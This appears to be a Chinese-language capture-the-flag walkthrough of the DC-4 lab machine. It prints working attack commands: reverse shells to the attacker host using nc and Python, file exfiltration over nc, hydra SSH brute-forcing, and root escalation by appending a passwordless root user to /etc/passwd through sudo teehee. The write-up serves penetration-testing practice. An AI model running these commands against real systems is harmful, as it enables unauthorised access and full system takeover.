# DC-4
照例取得ip,扫描端口
nmap -sV -O -p- -T4 -sS 192.168.111.137
![](vx_images/132056395328009.png)
开放了22和80端口

80端口是一个登录页面
![](vx_images/275024975618905.png)
进行目录扫描,也没有啥结果
试一下弱口令和万能密码
![](vx_images/471725935572264.png)
账号密码admin/happy
进去页面有三个功能
![](vx_images/352856052206467.png)
执行会回显代码,抓包看看执行的命令参数能否控制
![](vx_images/355492200276943.png)
可以控制,尝试执行反弹shell
```
kali上监听4444

nc -e /bin/bash 192.168.111.128 4444
交互式rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.111.128 4444 >/tmp/f
```
![](vx_images/188453897468160.png)
但此时并不是完整的shell,目标机上有python环境,升级shell环境
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.111.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
在jim用户下发现文件
![](vx_images/139807426043207.png)
其中mbox没有权限打开
下载备份文件
```
kali:
nc -lvnp 5555 > DC-4

目标机:
nc 192.168.111.128 5555 <
```
得到一些密码,很有可能可以作为ssh的密码
试一下ssh爆破
用工具hydra
```
hydra -l jim -P DC-4.txt 192.168.111.128 ssh
```
![](vx_images/178025602669908.png)
使用ssh登录
![](vx_images/40505620219924.png)
看一下能否suid提权
```
find / -perm -4000 -type f -exec ls -ld {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

```
![](vx_images/210114193344537.png)
ping无法suid提权
尝试的时候显示收到一封邮件
![](vx_images/319865544093310.png)
直接给了密码^xHhA&hvim0y
切换用户登录
切换直接提示错误,密码都不给输
提示:用户“Charles”没有 passwd 条目
用户名小写解决
登陆成功后看有无suid提权
结果一样
看看sudo提权,sudo -l 
![](vx_images/25654075243759.png)
能利用teeehee
```
teehee命令：teehee命令可以往一个文件中追加内容，可以通过这个命令向/etc/passwd中追加一个超级用户。
```
echo "hack::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
![](vx_images/351424830739293.png)
![](vx_images/219851994935968.png)
切换hack用户
![](vx_images/538415829937706.png)
完成


